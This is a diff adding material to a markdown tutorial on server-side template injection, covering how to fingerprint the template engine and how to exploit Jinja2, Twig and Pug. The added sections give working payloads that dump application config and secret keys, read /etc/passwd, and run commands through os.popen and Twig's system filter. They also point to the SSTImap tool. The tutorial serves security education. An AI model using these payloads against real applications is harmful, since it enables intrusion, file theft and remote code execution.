@@ -25,6 +25,27 @@ print(output)
 ```
 ## Determining the Template Engine
 Different template engines have distinct syntaxes and features, making them vulnerable to SSTI in various ways. Here are some examples of vulnerable template syntaxes:
+
+
+```
+                             Smarty
+                           /
+                         o
+                        /
+          a{*comment*}b                          Mako
+        /               \                       /
+       o                 x                     o
+      /                   \                  /
+${7*7}                     ${"z".join("ab")} ---- x ---- Unknown
+      \
+        x                                ---- o ---- 7777777 Jinja2
+         \                              /
+           {{7*7}} ---- o ---- {{7*'7'}} ---- o ---- 49 Twig
+               \                        \
+                 x                        x
+                  \                        \
+                   Not Vulnerable           Unknown
+```
 #### Python - Jinja2 
  If you use the payload {{7*'7'}}  in Jinja2, the output would be 7777777
  **Key Vulnerability Points:**
@@ -45,8 +66,41 @@ subprocess.check_output([command, arg1, arg2])
 
 - **command**: A string that specifies the command to execute.
 - **arg1, arg2, ...**: Additional arguments that should be passed to the command.
+
+**Information Disclosure**: We can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code.
+```jinja2
+{{ config.items() }}
+```
+Since this payload dumps the entire web application configuration, including any used secret keys, we can prepare further attacks using the obtained information. We can also execute Python code to obtain information about the web application's source code.
+```jinja2
+{{ self.__init__.__globals__.__builtins__ }}
+```
+**Local File Inclusion (LFI)**
+```jinja2
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+**RCE**
+```jinja2
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
 #### Twig
 If you use the payload {{7*'7'}} in Twig, the output would be 49.
+**Information disclosure** 
+In Twig, we can use the `_self` keyword to obtain a little information about the current template:
+```twig
+{{ _self }}
+```
+**Local File Inclusion (LFI)**
+Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:
+```twig
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+```
+**Remote Code Execution (RCE)**
+To achieve remote code execution, we can use a PHP built-in function such as system. We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads:
+
+```twig
+{{ ['id'] | filter('system') }}
+```
 #### NodeJS - Jade/Pug
 Pug/Jade evaluates JavaScript expressions within `#{}`. For example using the payload #{7* 7} would return 49. 
 Pug/Jade allows JavaScript execution within its templates without the need for additional delimiters like {{ }}. For example: `#{root.process.mainModule.require{'child_process'}.spawnSync("id").stdout}
@@ -112,3 +166,7 @@ Sandboxing is a security feature that restricts the execution of potentially har
 **Importance of Sandboxing**
 - **Function Restrictions**: Limits the functions or methods that can be called from within the template, blocking potentially harmful operations.
 - **Variable and Data Access**: Controls access to global variables or sensitive data, ensuring templates cannot manipulate or expose critical information.
+
+
+## Tools
+The most popular tool for identifying and exploiting SSTI vulnerabilities is [tplmap](https://github.com/epinna/tplmap). However, tplmap is not maintained anymore and runs on the deprecated Python2 version. Therefore, we will use the more modern [SSTImap](https://github.com/vladko312/SSTImap) to aid the SSTI exploitation process.
